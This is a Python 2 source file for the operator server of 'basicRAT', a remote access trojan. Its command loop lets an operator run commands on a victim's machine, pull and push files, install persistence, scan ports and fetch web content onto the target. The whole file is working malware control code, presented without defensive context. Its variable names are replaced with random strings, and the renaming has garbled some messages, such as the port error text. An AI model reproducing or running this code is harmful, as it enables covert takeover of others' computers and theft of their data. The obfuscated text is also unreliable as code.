#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz,jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw,uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA
    from core.filesock import yjQlCEghfMxsJwdmoDLBqnesZhMFoTtH, LsEvOAVQPRUrrNvbBUQcKlyeWdlSoWyi
except ImportError as avNHPTznqFYhEoRsxGTYMYACxLmbcQJs:
    print avNHPTznqFYhEoRsxGTYMYACxLmbcQJs
    sys.exit(0)
fVjugfgYsbQBsBnZwBQptfupZVklSrRQ = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
goprsypJmIctrMIOXFnXwkujBUkJIScC = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
nAegjzdIBDrnzDmdaCkvnasKlkgxZdpU = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
def lnJKjvBqeFEnHGnIVFNsLiZApaGkauip():
    BDLpHsHxXiSGLjzGWmWcZmvGryfkrYzs = argparse.ArgumentParser(description='basicRAT server')
    BDLpHsHxXiSGLjzGWmWcZmvGryfkrYzs.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return BDLpHsHxXiSGLjzGWmWcZmvGryfkrYzs
def IdarYTtwTCMUuBxkRmpKcsCdGsSVgaFX():
    BDLpHsHxXiSGLjzGWmWcZmvGryfkrYzs  = lnJKjvBqeFEnHGnIVFNsLiZApaGkauip()
    HZAkcIAVlBWPjJauGApGnrjiLsAOQHkM    = vars(BDLpHsHxXiSGLjzGWmWcZmvGryfkrYzs.parse_args())
    RgHqStJHWmndAVhQOaQOkswXxQXtOznO    = HZAkcIAVlBWPjJauGApGnrjiLsAOQHkM['port']
    GmwXZdrnoUbldKqssCIqWIqANfnQaEIj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.bind(('0.0.0.0', RgHqStJHWmndAVhQOaQOkswXxQXtOznO))
    except socket.error:
        print 'Error: Unable to start server, RgHqStJHWmndAVhQOaQOkswXxQXtOznO {} in use?'.format(RgHqStJHWmndAVhQOaQOkswXxQXtOznO)
        sys.exit(1)
    for byAVUoeLkhyQtUIGUylIiapicvNlHVzW in goprsypJmIctrMIOXFnXwkujBUkJIScC.split('\n'):
        time.sleep(0.05)
        print byAVUoeLkhyQtUIGUylIiapicvNlHVzW
    print 'basicRAT server listening on RgHqStJHWmndAVhQOaQOkswXxQXtOznO {}...'.format(RgHqStJHWmndAVhQOaQOkswXxQXtOznO)
    GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.listen(10)
    AdSFGRQVralMGoesvBKfdcNwbnGqfYxH, NOuOlCeRbeHStoyfaBUZqjmjdlhdWONH = GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.accept()
    mOwFAIMjnvpITALRtKohzxocgBwtHBNM = uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA(AdSFGRQVralMGoesvBKfdcNwbnGqfYxH, server=True)
    while True:
        AKlutEJPEOQkOShdgLBPZuJLXeExhjls = raw_input('\n[{}] basicRAT> '.format(NOuOlCeRbeHStoyfaBUZqjmjdlhdWONH[0])).rstrip()
        if not AKlutEJPEOQkOShdgLBPZuJLXeExhjls:
            continue
        wERuTKBOCPCahvPuqrVtuEthDpuhYngL, _, action = AKlutEJPEOQkOShdgLBPZuJLXeExhjls.partition(' ')
        if wERuTKBOCPCahvPuqrVtuEthDpuhYngL not in nAegjzdIBDrnzDmdaCkvnasKlkgxZdpU:
            print 'Invalid command, type "help" to see fcLdLNGFQIIQnyphkPbWAuEswFrDYfoc list of commands.'
            continue
        if wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'help':
            print fVjugfgYsbQBsBnZwBQptfupZVklSrRQ
            continue
        AdSFGRQVralMGoesvBKfdcNwbnGqfYxH.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(AKlutEJPEOQkOShdgLBPZuJLXeExhjls, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
        if wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'quit':
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.close()
            sys.exit(0)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'run':
            tPCRuXHuwVfgqtOhOWfZQiQORPmwSpqo = AdSFGRQVralMGoesvBKfdcNwbnGqfYxH.recv(4096)
            print vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz(tPCRuXHuwVfgqtOhOWfZQiQORPmwSpqo, mOwFAIMjnvpITALRtKohzxocgBwtHBNM).rstrip()
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'download':
            for FncUDhpNFnbFvciPnXtmEumcvADoZbpd in action.split():
                FncUDhpNFnbFvciPnXtmEumcvADoZbpd = FncUDhpNFnbFvciPnXtmEumcvADoZbpd.strip()
                yjQlCEghfMxsJwdmoDLBqnesZhMFoTtH(AdSFGRQVralMGoesvBKfdcNwbnGqfYxH, FncUDhpNFnbFvciPnXtmEumcvADoZbpd, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'upload':
            for FncUDhpNFnbFvciPnXtmEumcvADoZbpd in action.split():
                FncUDhpNFnbFvciPnXtmEumcvADoZbpd = FncUDhpNFnbFvciPnXtmEumcvADoZbpd.strip()
                LsEvOAVQPRUrrNvbBUQcKlyeWdlSoWyi(AdSFGRQVralMGoesvBKfdcNwbnGqfYxH, FncUDhpNFnbFvciPnXtmEumcvADoZbpd, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'rekey':
            mOwFAIMjnvpITALRtKohzxocgBwtHBNM = uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA(AdSFGRQVralMGoesvBKfdcNwbnGqfYxH, server=True)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(wERuTKBOCPCahvPuqrVtuEthDpuhYngL)
            tPCRuXHuwVfgqtOhOWfZQiQORPmwSpqo = AdSFGRQVralMGoesvBKfdcNwbnGqfYxH.recv(1024)
            print vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz(tPCRuXHuwVfgqtOhOWfZQiQORPmwSpqo, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
if __name__ == '__main__':
    IdarYTtwTCMUuBxkRmpKcsCdGsSVgaFX()
